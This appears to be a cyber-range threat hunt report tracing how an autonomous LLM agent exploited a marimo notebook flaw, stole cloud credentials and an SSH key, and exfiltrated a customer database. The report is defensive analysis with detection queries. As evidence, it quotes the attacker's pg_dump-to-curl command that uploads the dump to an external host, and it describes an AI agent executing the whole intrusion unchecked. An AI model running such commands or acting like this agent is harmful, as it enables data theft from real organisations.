<p align="center">
  <img src="tideglass-banner.svg" alt="TideGlass Banner" width="100%">
</p>

# THREAT HUNT REPORT

## Hunt 24: TideGlass — Autonomous LLM-Agent Post-Exploitation

### Rules applied throughout

All times are UTC on the attack clock (2026-08-14). Every claim traces to a named table, timestamp, and field. Confidence (High / Medium / Low) is stated on inferences only, never on facts. Gaps that could not be closed are called out as blind spots rather than guessed over.

---

## 1. Front Matter and Document Control

| Field | Value |
|-------|-------|
| Hunt ID | Hunt 24 — TideGlass |
| Analyst | Jenna Frank |
| Organization | PacificWatch SOC · Log(N) Pacific Cyber Range |
| Date | 2026-09-21 |
| Score | 96 / 100 |
| Placement | 1st of 39 |

---

## 2. Executive Summary

On the morning of the incident, a data-science notebook that Greenfield had left reachable from the internet answered a connection from an unfamiliar address. Within seconds an automated attacker was running code inside it, and within minutes it had stolen the host's cloud identity, enumerated the company's secrets vault, pulled a private SSH key, jumped to a second server, and shipped 2.8 million customer records to an external drop.

No human typed these commands. An autonomous AI agent was given a single sentence of direction: *find the most valuable customer data in the environment and get it out.* From that, the agent broke in through a known vulnerability in the marimo notebook server (CVE-2026-39987), stole cloud credentials from the instance metadata service, moved laterally via SSH, selected the largest database table by row count, and exfiltrated it compressed — all in 52 minutes with no further human input.

The difficult part was separating the attacker from a busy, legitimate estate. Dozens of ordinary processes, connections, key reads, and staff logins looked almost identical to the malicious ones. In every case the discriminator was a single field: parent process, acting process name, access-key prefix, target username, or source IP. The hunt documents nine such pairs in Finding 9.

The business impact is a confirmed loss of the full customer dataset. The credentials the attacker used are still live, the entry point is still open, and this hunt is handed to incident response for containment.

---

## 3. Overview Metadata

| Field | Value |
|-------|-------|
| Scenario | Autonomous LLM-agent post-exploitation |
| Attack Window | 2026-08-14 11:05:00 – 11:57:00 UTC |
| Target Environment | Greenfield (data-science platform) |
| Entry Point | marimo notebook server (gf-tg-nb01), CVE-2026-39987 |
| Attacker Identity | Autonomous AI agent, single human tasking line |
| RunId | tg-119-20260903 |
| Session ID (hostile) | tg-4b81e0d7 |

---

## 4. Hypothesis and ABLE Scope

**Hypothesis**: An autonomous LLM agent exploited the internet-facing marimo notebook via CVE-2026-39987 and executed a complete post-exploitation chain (cloud credential theft, lateral movement to internal infrastructure, data enumeration, and exfiltration of customer records) without further human direction.

**ABLE**:
- **Actor**: Autonomous LLM agent, human-tasked
- **Behavior**: RCE → credential theft → secrets enumeration → lateral movement → data exfiltration
- **Locus**: gf-tg-nb01 (notebook), AWS Secrets Manager, gf-tg-bastion01 (bastion), gf-tg-pg01 (database)
- **Evidence**: LinuxProcess_CL, LinuxNetwork_CL, LinuxAuth_CL, LinuxShellHistory_CL, AWSCloudTrail, LLMAgentLogs_CL, ApacheAccess_CL, Syslog

---

## 5. Threat Intel Inputs

Intel scoped where to look and what the chain should resemble. It cannot, on its own, confirm an actor or prove any step occurred in this estate. The Sysdig reporting in particular describes a throttle-and-rotate pattern the agent uses against Secrets Manager; this shaped the egress-pool hypothesis in Section 7.4.

---

## 6. Scope, Data Sources and Blind Spots

### Blind spots (required)

**No rate-limit responses in CloudTrail.** A query for any populated ErrorCode on the attacker's access key returns zero rows. The ThrottlingException the intel describes is not present. The egress-pool rotation is proved from the IP distribution and timing gaps; the throttle itself is inferred (Medium confidence) from the gap-and-resume shape but cannot be confirmed from telemetry.

**Secret contents are not recoverable from the cloud log.** On GetSecretValue, ResponseElements records the VersionId only, never the plaintext. The stolen key material cannot be recovered from AWSCloudTrail alone.

**Egress-pool infrastructure is invisible.** Only the six source IP addresses are in telemetry. The pool provider (attributed to Cloudflare Workers in the OSINT) is not.

**RequestParameters did not render the SecretId in the live pull.** The specific secret targeted was confirmed from the agent's own reasoning log rather than from the CloudTrail request body, a second-source confirmation noted in the finding.

**Shared workspace.** LLMAgentLogs_CL contains both TideGlass and JADEPUFFER agent activity. Every query against it is scoped by RunId `tg-119-20260903` or session_id `tg-4b81e0d7`.

**Ingestion-date artifact.** The lab data was ingested on 2026-09-04, so TimeGenerated in the workspace reads 2026-09-04 for these events. The attack hours (11:05 to 11:57) are authoritative and are used for all scoping.

---

## 7. Execution

*The real path, including the wrong turns that forced better pivots.*

### 7.1 Anchor the interpreter, then find what triggered it

**Question**: What process started under the notebook service, and what web request preceded it?

```kql
LinuxProcess_CL
| where EventStartTime between (datetime(2026-09-04 11:05) .. datetime(2026-09-04 11:57))
| where Dvc == "gf-tg-nb01"
| project EventStartTime, TargetProcessName, TargetProcessId, TargetProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| sort by EventStartTime asc
```

**Returned**: python3.12 (PID 5211) at 11:05:06, parented by the marimo service (PID 3310). A GET /ws/kernel returning HTTP 101 from 198.51.100.23 at 11:05:00, six seconds earlier. Read: the request and the spawn are causally linked.

> **Evidence**: ApacheAccess_CL. GET /ws/kernel returns HTTP 101 from 198.51.100.23 at 11:05:00.

> **Evidence**: LinuxProcess_CL. python3.12 PID 5211 spawned under the marimo service at 11:05:06.

### 7.2 Confirm the CVE in-workspace, not just from intel

**Question**: Does the agent name the vulnerability itself?

```kql
LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7"
| where model_response has "CVE" or model_response has "marimo"
| project TimeGenerated, model_response
| sort by TimeGenerated asc
```

**Returned**: At 11:05:02, the agent reasons that marimo is exposed on 2718 with no token and the kernel WebSocket accepts code without authentication (CVE-2026-39987). Read: CVE confirmed from telemetry, not just intel.

### 7.3 Pivot the interpreter into the network for credential theft

**Question**: Did PID 5211 reach the metadata service, and what identity came back?

```kql
LinuxNetwork_CL
| where EventStartTime between (datetime(2026-09-04 11:05) .. datetime(2026-09-04 11:57))
| where DstIpAddr == "169.254.169.254"
| summarize count() by ActingProcessName

LLMAgentLogs_CL
| where session_id == "tg-4b81e0d7"
| where model_response has "credential" or model_response has "arn:"
| project TimeGenerated, model_response
```

**Returned**: Bounded to the window, ten connections reach 169.254.169.254: nine from the refresh credential-helper daemon and exactly one from the interpreter python3.12 (PID 5211, 11:08:12). The agent confirms: "Role credentials retrieved for arn:aws:iam::402913776148:user/svc-notebook."

> **Evidence**: LinuxNetwork_CL. In-window, 10 connections to 169.254.169.254; only PID 5211 (python3.12, 11:08:12) is not the refresh daemon.

### 7.4 One key, many faces: the egress pool and the throttle

**Question**: How many source addresses did the stolen key use, and can the throttle be proved?

```kql
AWSCloudTrail
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventSource == "secretsmanager.amazonaws.com"
| summarize calls=count(), ips=dcount(SourceIpAddress), pool=make_set(SourceIpAddress) by bin(TimeGenerated, 1m)
| sort by TimeGenerated asc
```

**Returned**: Six distinct source IPs; a 24-second gap at 11:22:41 (from .71) resuming at 11:23:05 (from .94). Read: rotation is proved from data. The throttle is inferred from the gap-and-resume shape because no ThrottlingException or ErrorCode is present in CloudTrail (Confidence: Medium).

> **Evidence**: AWSCloudTrail. The svc-notebook key across the pool; the 24-second gap at 11:22:41 (.71) resuming 11:23:05 (.94).

### 7.5 Recon versus theft, then trace the key to the login

**Question**: Which secret call took something, and where did the key go?

```kql
AWSCloudTrail
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventName == "GetSecretValue"
| project TimeGenerated, ReadOnly, ResponseElements, SourceIpAddress

LinuxShellHistory_CL
| where Command has "id_ed25519" or Command has "chmod"
| project TimeGenerated, Computer, ShellUser, Command

LinuxAuth_CL
| where DvcHostname == "gf-tg-bastion01"
| where EventResult == "Success"
| project TimeGenerated, TargetUsername, EventOriginalMessage
| sort by TimeGenerated asc
```

**Returned**: One GetSecretValue (the retrieval call, distinct from List/DescribeSecret) at 11:31:16, tagged ReadOnly=false in this lab data; chmod 600 /tmp/.c/id_ed25519 at 11:31:22 (user marimo); Accepted publickey for deploy from 10.6.0.10 at 11:34:27 on the bastion.

> **Evidence**: AWSCloudTrail. The single GetSecretValue retrieval at 11:31:16 from 203.0.113.142 (tagged ReadOnly=false in this lab, inverted from real CloudTrail).

> **Evidence**: LLMAgentLogs_CL. The agent confirms it retrieved a passphrase-less deploy key for the bastion at 11:31:20.

> **Evidence**: LinuxShellHistory_CL. chmod 600 /tmp/.c/id_ed25519, user marimo, 11:31:22.

> **Evidence**: LinuxAuth_CL. Accepted publickey for deploy from 10.6.0.10 on the bastion at 11:34:27, with the ED25519 fingerprint.

### 7.6 Recon by size, dump, and prove it from the database

**Question**: Which table did it choose, and can the access be proved from Postgres?

```kql
LinuxShellHistory_CL
| where ShellUser == "deploy"
| project TimeGenerated, Command
| sort by TimeGenerated asc

Syslog
| where Computer == "gf-tg-pg01"
| where SyslogMessage has "connection authorized"
| project TimeGenerated, SyslogMessage
```

**Returned**: `psql ... '\dt+' | sort -k7 -h | tail -5` at 11:37:40; agent identifies customers at 2,841,902 rows at 11:37:42; `pg_dump ... customers | gzip | curl -T - https://203.0.113.41:8443/u` at 11:40:49. Postgres syslog confirms `connection authorized: user=app database=customers host=10.6.0.20` at 11:40:44.

> **Evidence**: LinuxShellHistory_CL. The deploy account's psql table-size recon and the pg_dump-to-curl exfiltration.

> **Evidence**: LLMAgentLogs_CL. The agent identifies customers as the largest table at 2,841,902 rows, 11:37:42.

> **Evidence**: Syslog on gf-tg-pg01. connection authorized: user=app database=customers host=10.6.0.20 at 11:40:44.

### 7.7 Dead ends

- **Dead end**: the `tool_args` column does not exist; this schema error led to the getschema check that surfaced the gate fields.
- **Dead end resolved**: getschema confirms no tool_args, and reveals gate_decision / gate_reason.
- **Dead end**: a stray comma and the reserved word `first` broke the session summary; corrected to start_time/end_time.
- **Dead end**: GetSecretValue error/parameter query returns no rows, establishing the throttle is unlogged.
- **Dead end**: every bastion login has a unique fingerprint (logins=1), so fingerprint uniqueness is not a discriminator.

---

## 8. UTC Timeline

| Time (UTC) | Event | Source |
|------------|-------|--------|
| 11:05:00 | GET /ws/kernel → HTTP 101 from 198.51.100.23 | ApacheAccess_CL |
| 11:05:02 | Agent identifies CVE-2026-39987 (marimo, no auth) | LLMAgentLogs_CL |
| 11:05:06 | python3.12 PID 5211 spawned under marimo service | LinuxProcess_CL |
| 11:08:12 | PID 5211 connects to IMDS (169.254.169.254) | LinuxNetwork_CL |
| 11:08:19 | Agent: "Role credentials retrieved for svc-notebook" | LLMAgentLogs_CL |
| 11:08–11:31 | Secrets Manager enumeration across 6-IP egress pool | AWSCloudTrail |
| 11:22:41 | 24-second gap (last call from .71) | AWSCloudTrail |
| 11:23:05 | Calls resume from .94 (inferred throttle/rotate) | AWSCloudTrail |
| 11:31:16 | GetSecretValue — bastion deploy key stolen | AWSCloudTrail |
| 11:31:20 | Agent confirms passphrase-less deploy key | LLMAgentLogs_CL |
| 11:31:22 | chmod 600 /tmp/.c/id_ed25519 (user: marimo) | LinuxShellHistory_CL |
| 11:34:27 | SSH login: deploy from 10.6.0.10 → bastion | LinuxAuth_CL |
| 11:37:40 | psql table-size recon (\dt+ → sort → tail) | LinuxShellHistory_CL |
| 11:37:42 | Agent: customers = largest table, 2,841,902 rows | LLMAgentLogs_CL |
| 11:40:44 | Postgres: connection authorized user=app db=customers | Syslog |
| 11:40:49 | pg_dump \| gzip \| curl → exfiltration to 203.0.113.41:8443 | LinuxShellHistory_CL |
| 11:40:49 | Outbound TCP to 203.0.113.41:8443 confirmed | LinuxNetwork_CL |

---

## 9. Findings

### F1: Unauthenticated marimo kernel RCE was the entry point

**State it**: The notebook was compromised through an unauthenticated marimo kernel WebSocket (CVE-2026-39987). **Show it**: ApacheAccess_CL, 2026-08-14 11:05:00, GET /ws/kernel, HttpStatus 101, ClientIP 198.51.100.23. The agent's own reasoning confirms: "marimo is exposed on 2718 with no token" (LLMAgentLogs_CL, 11:05:02). **Interpret it**: ATT&CK T1190, Exploit Public-Facing Application.

### F2: Code execution ran as an interpreter under the notebook service

**State it**: The exploit spawned a python3.12 interpreter parented by the marimo service. **Show it**: LinuxProcess_CL, 2026-08-14 11:05:06, TargetProcessName python3.12, TargetProcessId 5211, ActingProcessName python3.12, ActingProcessCommandLine `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`. **Interpret it**: ATT&CK T1059.006, Command and Scripting Interpreter: Python.

### F3: The agent stole the notebook's cloud identity via the metadata service

**State it**: The interpreter reached the instance metadata service, and the agent narrated retrieving credentials for the svc-notebook identity. (What can be stated from telemetry is the IMDS connection from python3.12 and the narrated identity; the actual token is not logged.)

> Evidence: LLMAgentLogs_CL, 11:08:19, "Role credentials retrieved for arn:aws:iam::402913776148:user/svc-notebook." The stolen identity was distinguished from two benign CloudTrail identities (ci-deploy-role from GitHub Actions, app-role from the application) by access-key prefix: the theft uses an AKIA key (long-lived user), the legitimate callers use ASIA keys (role sessions).

> Evidence: MITRE ATLAS AML.T0098, AI Agent Tool Credential Harvesting, maturity Realized (v2026.09).

**Interpret it**: ATT&CK T1552.005, Unsecured Credentials: Cloud Instance Metadata API.

### F4: Secrets access was routed through a six-address egress pool

**State it**: The stolen access key AKIA4TIDEGLASS0EXAMPLE was used against Secrets Manager from six distinct external addresses. **Show it**: AWSCloudTrail, dcount(SourceIpAddress) = 6: 203.0.113.71, .94, .118, .142, .167, .203. A 24-second gap at 11:22:41 (.71) resuming at 11:23:05 (.94) is consistent with the Sysdig-reported throttle-and-rotate behavior but cannot be confirmed (no ThrottlingException in CloudTrail; Confidence: Medium). **Interpret it**: ATT&CK T1090, Proxy.

### F5: A single GetSecretValue call stole the bastion deploy key

**State it**: One GetSecretValue call retrieved the bastion SSH deploy key; the rest were reconnaissance. **Show it**: AWSCloudTrail, 2026-08-14 11:31:16, EventName GetSecretValue, from 203.0.113.142. The retrieved secret was confirmed via the agent's own log: "passphrase-less deploy key for the bastion" (LLMAgentLogs_CL, 11:31:20). **Interpret it**: ATT&CK T1552.004, Unsecured Credentials: Private Keys; T1555.006, Credentials from Password Stores: Cloud Secrets Manager.

> Evidence: AWSCloudTrail. GetSecretValue identities: the app-role uses an ASIA session key; the theft uses the svc-notebook AKIA user key.

### F6: The stolen key was used to move laterally to the bastion

**State it**: The deploy key was written to disk on the notebook host and used to SSH into the bastion as the deploy service account. **Show it**: LinuxShellHistory_CL, 2026-08-14 11:31:22, chmod 600 /tmp/.c/id_ed25519 (user marimo); LinuxAuth_CL, 2026-08-14 11:34:27, Accepted publickey for deploy from 10.6.0.10 port 51234 ssh2: ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE. **Interpret it**: ATT&CK T1021.004, Remote Services: SSH; T1078.004, Valid Accounts: Cloud Accounts.

> Evidence: LinuxAuth_CL. deploy is one login against the human developer accounts; the account is the discriminator.

> Evidence: LinuxAuth_CL. The deploy login sources from 10.6.0.10 (the notebook host); every human login is 10.6.0.5x.

### F7: The customer database was enumerated by size, dumped, and exfiltrated

**State it**: The agent selected the largest table (customers, ~2.8M rows) and exfiltrated it compressed to an external destination. **Show it**: LinuxShellHistory_CL, 2026-08-14 11:37:40, `psql -h 10.6.0.30 -U app '\dt+' | sort -k7 -h | tail -5`; LLMAgentLogs_CL, 11:37:42, "customers ... largest object ... 2841902 rows"; LinuxShellHistory_CL, 11:40:49, `pg_dump -h 10.6.0.30 -U app -Fc customers | gzip | curl -s -T - https://203.0.113.41:8443/u`.

> Evidence: LinuxNetwork_CL. Outbound TCP 10.6.0.20:51402 (bastion, deploy) to 203.0.113.41:8443 at 11:40:49.336, ActingProcessName bash (PID 6310). Confirms the upload connection; no bytes/duration field.

**Interpret it**: ATT&CK T1213.006, Data from Information Repositories: Databases (which lists PostgreSQL among its example databases; MITRE's own detection strategy for it describes psql access by non-admin accounts). ATT&CK T1567.002, Exfiltration Over Web Service: Exfiltration to Cloud Storage.

> Evidence: LinuxShellHistory_CL, day-scoped. 20 legitimate backup runs (backup@gf-tg-pg01, greenfield_platform, local path) bracket the single theft (deploy@gf-tg-bastion01, customers, external curl) and confirm that user, database, and destination all differ.

### F8: The chain was human-tasked and executed autonomously

**State it**: One human instruction started the operation; the agent executed all 52 minutes of it itself, and its safety rail permitted every action. **Show it**: LLMAgentLogs_CL holds four sessions under RunId tg-119-20260903; session tg-4b81e0d7 is the hostile one, distinguished by its single human-direction line and its attack behavior.

> Evidence: LLMAgentLogs_CL. All nine agent actions: gate_decision=allow, gate_reason=no policy matched.

> Evidence: LLMAgentLogs_CL. The single human tasking line on the hostile session's first record.

**Interpret it**: The verdict is human-tasked (a person set a machine going), not human-driven and not fully autonomous. Confidence: High, from the single tasking line, the self-narrating reasoning at each step, and the gate log showing no human override was requested or provided.

### F9: Every malicious step had a legitimate twin, separated by one field

**State it**: The estate's normal activity closely mimics each attack step; each was separated by naming and excluding the baseline. **Show it**:
- python3.12 spawns on gf-tg-nb01: 74 total. 72 parented to batch jobs, 1 to a cron health-check, 1 to the marimo service (the attacker). **Discriminator**: parent command line.
- IMDS connections: 10 total. 9 from the refresh credential-helper daemon, 1 from python3.12 (the attacker). **Discriminator**: ActingProcessName.
- Secret reads: routine application reads are the same EventName (GetSecretValue), successful, and carry the same lab ReadOnly value as the theft, so neither the event name nor ReadOnly separates them. **Discriminator**: access-key prefix (AKIA vs ASIA).
- Bastion admin logins: ~318, all publickey. **Discriminator**: TargetUsername = deploy (a service account among human accounts), corroborated by source IP (notebook host vs developer range).

> Evidence: LinuxProcess_CL. python3.12 spawns by parent command line; only the marimo-parented process is the attacker's.

> Evidence: LinuxNetwork_CL. In-window metadata reads by process: 9 refresh, 1 python3.12 (bounded by EventStartTime to 11:05 to 11:57).

### F10: The agent's cloud calls carry a distinctive HTTP-library user-agent

**State it**: Every AWS API call made with the stolen key carries the user-agent `python-httpx/0.27.0`, the HTTP library the agent used, not an AWS SDK or console string. **Show it**: AWSCloudTrail, attacker key = AKIA4TIDEGLASS0EXAMPLE, dcount(UserAgent)=1, UserAgent = python-httpx/0.27.0.

> Evidence: AWSCloudTrail. All calls on the stolen key present a single user-agent, python-httpx/0.27.0.

### 9.x Negative Findings

> Evidence: LinuxShellHistory_CL. The search for the deploy account reading a Postgres credential (.pgpass/PGPASSWORD/cat/env) returns no results in-window: the credential-path gap is a confirmed telemetry blind spot.

---

## 10. Hypothesis Outcome

**Outcome**: Proved, with two links unresolved.

**Justification**: Every element of the hypothesis is evidenced. The marimo RCE is confirmed (F1), the interpreter lineage is malicious (F2), the metadata-service credential theft occurred (F3), the rotating egress pool is proved (F4), the secret retrieval is isolated (F5), the lateral SSH move is traced (F6), the database dump and exfiltration are confirmed end-to-end (F7), and the autonomous agent execution is established from the log (F8). The two unresolved links: the throttle behavior (Medium confidence, gap-shaped but unlogged) and the deploy account's path to the Postgres credential (no telemetry).

---

## 11. ATT&CK Coverage

### Observed

| Technique | Name | Finding |
|-----------|------|---------|
| T1190 | Exploit Public-Facing Application | F1 |
| T1059.006 | Command and Scripting Interpreter: Python | F2 |
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | F3 |
| T1090 | Proxy | F4 |
| T1552.004 | Unsecured Credentials: Private Keys | F5 |
| T1555.006 | Credentials from Password Stores: Cloud Secrets Manager | F5 |
| T1078.004 | Valid Accounts: Cloud Accounts | F6 |
| T1021.004 | Remote Services: SSH | F6 |
| T1213.006 | Data from Information Repositories: Databases | F7 |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | F7 |
| AML.T0098 | AI Agent Tool Credential Harvesting (ATLAS) | F3, F8 |

### Hunted, not observed

| Technique | Name | Notes |
|-----------|------|-------|
| T1048 | Exfiltration Over Alternative Protocol | Exfiltration used HTTPS (T1567.002), not an alternative protocol |
| T1071.001 | Application Layer Protocol: Web Protocols | No persistent C2 channel observed; agent operated autonomously |

---

## 12. Detection and Telemetry Gaps

See Section 6 (Blind Spots) and the negative finding in Section 9.x. Key gaps:

1. **No CloudTrail ErrorCode for rate limiting** — the throttle-and-rotate pattern cannot be confirmed from logs alone
2. **Secret plaintext not logged** — GetSecretValue response never includes the secret content
3. **Postgres credential path unlogged** — how the deploy account authenticated to the database is a telemetry gap
4. **Egress pool provider invisible** — only exit IPs visible, not the proxy infrastructure

---

## 13. New Detections Authored

Each rule below has concrete detection logic, a data source, a false-positive assessment, and an ATT&CK mapping. See the [`detections/`](detections/) directory for standalone KQL files.

| ID | Detection | Key Table | ATT&CK |
|----|-----------|-----------|--------|
| D1 | Marimo kernel RCE (external WebSocket upgrade) | ApacheAccess_CL | T1190 |
| D2 | Interpreter spawned by the notebook service | LinuxProcess_CL + LinuxNetwork_CL | T1059.006 |
| D3 | IMDS access from non-credential-helper process | LinuxNetwork_CL | T1552.005 |
| D4 | One access key across many source IPs (egress pool) | AWSCloudTrail | T1090 |
| D5 | Secret retrieval by a static IAM user | AWSCloudTrail | T1552.004, T1555.006 |
| D6 | Service-account SSH / bastion login from notebook | LinuxAuth_CL | T1021.004, T1078.004 |
| D7 | Database dump to an external destination | LinuxShellHistory_CL | T1213.006, T1567.002 |
| D8 | Agent action with no gate policy (guardrail gap) | LLMAgentLogs_CL | AML.T0098 |
| D9 | Non-SDK HTTP-library user-agent on AWS API calls | AWSCloudTrail | — |

---

## 14. Handover to IR

Immediate actions for incident response:
1. **Rotate** the svc-notebook access key (AKIA4TIDEGLASS0EXAMPLE) — it is still active
2. **Patch or isolate** gf-tg-nb01 — the marimo service is still running with `--no-token`
3. **Revoke** the bastion deploy key (ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE)
4. **Assess breach scope** — 2.8M customer records confirmed exfiltrated
5. **Review** all LLMAgentLogs_CL sessions under RunId tg-119-20260903 for additional hostile activity

---

## 15. Next-Hunt Leads

1. Other sessions in the same RunId — three non-hostile sessions exist; are they reconnaissance?
2. The egress pool IPs (203.0.113.x range) — do they appear in other environments?
3. The `python-httpx/0.27.0` user-agent — retrohunt across all CloudTrail for other uses
4. Gate bypass patterns — what would it take to trigger a gate_decision=deny?

---

## 16. Appendices

### A. Full queries

```kql
// Table inventory (scope check)
Usage
| where TimeGenerated between (datetime(2026-09-04 11:05) .. datetime(2026-09-04 11:57))
| summarize GB = round(sum(Quantity)/1000, 3) by Table = DataType
| sort by GB desc
```

### B. Raw evidence extracts

| Timestamp | Source | Evidence |
|-----------|--------|----------|
| 11:05:00 | ApacheAccess_CL | GET /ws/kernel 101 from 198.51.100.23 |
| 11:05:02 | LLMAgentLogs_CL | "...kernel WebSocket accepts code without authentication (CVE-2026-39987)..." |
| 11:05:06 | LinuxProcess_CL | python3.12 PID 5211, parent PID 3310 (`/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`) |
| 11:08:19 | LLMAgentLogs_CL | "Role credentials retrieved for arn:aws:iam::402913776148:user/svc-notebook." |
| 11:08–11:31 | AWSCloudTrail | AKIA4TIDEGLASS0EXAMPLE across 203.0.113.71/.94/.118/.142/.167/.203 |
| 11:31:16 | AWSCloudTrail | GetSecretValue from 203.0.113.142 |
| 11:31:20 | LLMAgentLogs_CL | "passphrase-less deploy key for the bastion" |
| 11:31:22 | LinuxShellHistory_CL | chmod 600 /tmp/.c/id_ed25519 (user: marimo) |
| 11:34:27 | LinuxAuth_CL | Accepted publickey for deploy from 10.6.0.10 ... ED25519 |
| 11:37:42 | LLMAgentLogs_CL | "customers ... largest object ... 2841902 rows" |
| 11:40:44 | Syslog | connection authorized: user=app database=customers host=10.6.0.20 |
| 11:40:49 | LinuxShellHistory_CL | pg_dump ... customers \| gzip \| curl -s -T - https://203.0.113.41:8443/u |
| 11:40:49 | LinuxNetwork_CL | Outbound TCP 10.6.0.20:51402 → 203.0.113.41:8443, bash PID 6310 |
| — | LLMAgentLogs_CL | All 9 agent actions: gate_decision=allow, gate_reason="no policy matched" |
| — | AWSCloudTrail | Attacker key UserAgent = python-httpx/0.27.0 (single value) |
| — | LinuxShellHistory_CL | Nightly backup = pg_dump -h localhost -U backup -Fc greenfield_platform \| gzip > /backup/... vs theft = remote host, different user, different db, external curl |
| — | LinuxShellHistory_CL | Deploy-account DB-credential search (.pgpass/PGPASSWORD/cat/env) = no rows (gap) |

### C. Reference list

- MITRE ATT&CK, attack.mitre.org (T1190, T1059.006, T1552.004, T1552.005, T1555.006, T1078.004, T1090, T1021.004, T1213.006, T1567.002)
- MITRE ATLAS, atlas.mitre.org, v2026.09 (AML.T0098, AI Agent Tool Credential Harvesting, Realized)
- Sysdig Threat Research / The Hacker News: LLM Agent Post-Exploitation after Marimo CVE-2026-39987
- PEAK Threat Hunting Framework (Splunk SURGe); TaHiTI methodology
- CVE-2026-39987 (marimo unauthenticated kernel RCE)
- MITRE ATLAS mitigation AML.M0032, Segmentation of AI Agent Components

---

*LOG(N) Pacific Cyber Range. Hunt report shaped to PEAK (Splunk SURGe) and TaHiTI. PacificWatch SOC // Hunt 24 TideGlass // Analyst: Jenna Frank // 2026-09-21.*
